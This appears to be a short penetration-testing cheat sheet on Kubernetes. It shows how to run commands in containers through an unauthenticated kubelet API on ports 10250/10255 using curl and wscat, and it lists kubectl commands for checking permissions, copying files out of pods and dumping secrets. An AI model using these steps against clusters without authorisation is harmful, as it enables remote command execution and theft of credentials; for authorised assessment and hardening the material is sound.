---
title: "Kubernetes"
description: "Check Kubernetes API and execute commands with kubectl"
date: 23/11/2020
categories:
 - Misc
tags:
 - docker
 - kubernetes
---


## API

The Kubernetes API exposes the ports `10250` and `10255` (HTTP read-only).
This API can be used to interact with the Kubernetes engine which basically
give us the right to do anything you desire unauthenticated.


### List pods

To confirm that the host is running Docker you can make a GET requests to `/pods`:

```
https://<host>:<port>/pods
```

```json
{"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"dind-sgz8n","generateName":"dind-","namespace":"default","selfLink":"/api/v1/namespaces/default/pods/dind-sgz8n",`...}],"qosClass":"BestEffort"}}]}
```


### Execute commands

With the above information it's possible to send requests to the API to execute
commands:

```bash
$ curl --insecure -v -H "W-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -H "Connection: upgrade" -H "Upgrade: SPDY/3.1" -X POST "https://<host>:<port>/exec/<namespace>/<pod_name>/<container_name>?command=<cmd>&input=1&output=1&tty=1"
```

In the response, there is a `Location` header to create a WebSocket connection:

```bash
$ wscat -c "https://<host>:<port>/<location_header>" --no-check
```


## Useful kubectl commands

You can add the argument `--kubeconfig {CONFIG_PATH]}` to every commands to
specify a configuration file.

If there is multiple namespace, then add the argument `--namespace {NAMESPACE}`
to be sure to interact with the correct namespace.


#### Kubernetes version

```bash
kubectl version
```

#### Check API access

Use the [`can-i`](https://kubernetes.io/docs/reference/access-authn-authz/authorization/#checking-api-access)
command to check your rights on the API. Don't forget to check for different
namespaces.

```bash
kubectl auth can-i --list --namespace {NAMESPACE}
kubectl auth can-i create pods/exec --namespace {NAMESPACE}
kubectl auth can-i get pods/logs --namespace {NAMESPACE}
```

#### Start a pod

```bash
kubectl run k8s-2-test -ti --rm --image=debian --generator=run-pod/v1
```

#### Attach to an existing pod

```bash
kubectl exec -it k8s-2-test -- /bin/bash
```

#### Connect to an existing connection

```bash
kubectl attach k8s-1-test -c k8s-1-test -i -t
```

#### Copy a file from a pod to the local machine

```bash
kubectl cp default/k8s-1-test:{FILE} ./{FILE_DEST}
```

#### Print services

```bash
kubectl get services (-o wide)
```

#### Print pods

```bash
kubectl get pods -o json
kubectl get pods -o wide
kubectl get pods -o wide | sed -e 's/\s\+/ /g' | cut -f6 -d " "
```

#### Print secrets

```bash
kubectl get secrets -o yaml
kubectl get secret {SECRET_NAME} -o yaml
```
